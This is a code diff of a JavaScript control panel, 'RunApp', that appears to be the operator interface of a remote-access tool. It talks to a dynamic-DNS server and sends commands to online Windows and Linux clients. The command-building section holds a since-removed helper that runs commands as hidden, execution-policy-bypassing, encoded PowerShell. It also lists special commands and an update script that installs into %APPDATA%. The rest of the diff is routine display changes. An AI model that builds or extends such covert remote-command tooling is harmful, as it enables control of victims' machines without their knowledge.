@@ -1,5 +1,5 @@
 const RunApp = (() => {
-    const VPS_URL = 'http://runx.ddns.net/';
+    const VPS_URL = 'http://runx.ddns.net';
 
     const runState = {
         rows: [], sortedRows: [],
@@ -26,7 +26,6 @@ const RunApp = (() => {
 
     const $ = id => document.getElementById(id);
     const themeNames = ['night', 'graphite', 'midnight', 'forest', 'ember', 'polar'];
-    const conflictTimers = new Map();
 
     // ── Theme helpers ──
     const cap = s => s.charAt(0).toUpperCase() + s.slice(1);
@@ -136,6 +135,7 @@ const RunApp = (() => {
                     const row = runState.rows.find(r => r.username === data.username);
                     if (row) {
                         row.online = !!data.online;
+                        if (data.version !== undefined) row.version = data.version;
                         runState.sortedRows = sortRows(runState.rows);
                         renderGrid();
                     } else {
@@ -230,12 +230,13 @@ const RunApp = (() => {
         const displayUsername = getDisplayUsername(user.username);
         const showWin = isWindowsUsername(user.username);
         const showLinux = isLinuxUsername(user.username);
+        const versionAttr = user.version ? ` title="${user.version}"` : '';
         return `
                 <div class="card-header">
                     <div style="flex:1;min-width:0;">
                         <div style="display:flex;align-items:center;gap:8px;">
                             ${showWin ? WIN_LOGO_HTML : ''}${showLinux ? LINUX_LOGO_HTML : ''}
-                            <span class="card-username ${alive ? '' : 'offline'}">${displayUsername}</span>
+                            <span class="card-username ${alive ? '' : 'offline'}"${versionAttr}>${displayUsername}</span>
                         </div>
                         <div class="card-ts">${tsText}</div>
                     </div>
@@ -250,7 +251,7 @@ const RunApp = (() => {
                 </div>`;
     }
     function getCardRenderSignature(user, status, alive, tsText, showHint) {
-        return `${user.username}|${getDisplayUsername(user.username)}|${status}|${alive ? 1 : 0}|${showHint ? 1 : 0}|${tsText}`;
+        return `${user.username}|${getDisplayUsername(user.username)}|${user.version || ''}|${status}|${alive ? 1 : 0}|${showHint ? 1 : 0}|${tsText}`;
     }
 
     function renderGrid() {
@@ -390,14 +391,6 @@ const RunApp = (() => {
         updatePlaceholder();
     }
 
-    function flashConflict(buttonId) {
-        const button = $(buttonId); if (!button) return;
-        button.classList.add('conflict');
-        const existing = conflictTimers.get(buttonId);
-        if (existing) clearTimeout(existing);
-        conflictTimers.set(buttonId, setTimeout(() => { button.classList.remove('conflict'); conflictTimers.delete(buttonId); }, 1500));
-    }
-
     // ── Popup open/close ──
     const ACTION_MODE_LABELS = {
         cmd: 'Commandline',
@@ -498,25 +491,8 @@ const RunApp = (() => {
     }
 
     // ── Command building ──
-    function bytesToBase64(bytes) {
-        const chunkSize = 0x8000; let binary = '';
-        for (let i = 0; i < bytes.length; i += chunkSize)
-            binary += String.fromCharCode(...bytes.subarray(i, i + chunkSize));
-        return btoa(binary);
-    }
     function formatPSString(str) {
         return str.replace(/'/g, "''").split(/\r?\n/).map(line => `'${line}'`).join(' + [char]13 + ');
-    }
-    function wrapPowershell(val, hidden = true) {
-        const utf16 = new Uint8Array(val.length * 2);
-        for (let i = 0; i < val.length; i++) {
-            const c = val.charCodeAt(i);
-            utf16[i * 2] = c & 0xff; utf16[i * 2 + 1] = (c >> 8) & 0xff;
-        }
-        return `powershell -NoP -EP Bypass -W ${hidden ? 'H' : 'Normal'} -EncodedCommand ${bytesToBase64(utf16)}`;
-    }
-    function isSpecialCommandInput(text) {
-        return /^(panic|nodat|altf4)(?:\b|$)/i.test((text || '').trim());
     }
 
     const UPDATE_CLIENT_SCRIPT = `$p = "$env:APPDATA\\run"
